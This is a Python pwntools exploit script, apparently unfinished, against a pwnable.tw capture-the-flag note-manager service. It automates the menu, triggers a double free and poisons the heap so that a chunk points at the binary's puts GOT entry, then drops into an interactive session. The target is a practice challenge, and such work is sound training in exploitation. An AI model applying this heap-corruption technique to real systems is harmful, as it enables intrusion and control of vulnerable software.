#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
s = lambda p,a: p.send(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chall.pwnable.tw"
PORT = 10102

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"Your choice :")
    sl(p,b"1")
    ru(p,b"Note size :")
    sl(p,b"%i" % size)
    ru(p,b"Content :")
    sl(p,value)

def delete(p, index):
    ru(p,b"Your choice :")
    sl(p,b"2")
    ru(p,b"Index :")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"Your choice :")
    sl(p,b"3")
    ru(p,b"Index :")
    sl(p,"%i" % index)
    return rl(p)
    

def exploit(p,e,l):

    create(p,0x28,b"A" * 0x28)
    create(p,0x28,b"B" * 0x28)
    delete(p,0)
    delete(p,1)
    delete(p,0)

    create(p,0x28,p64(e.got["puts"]))
    create(p,0x28,b"C" * 0x28)

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
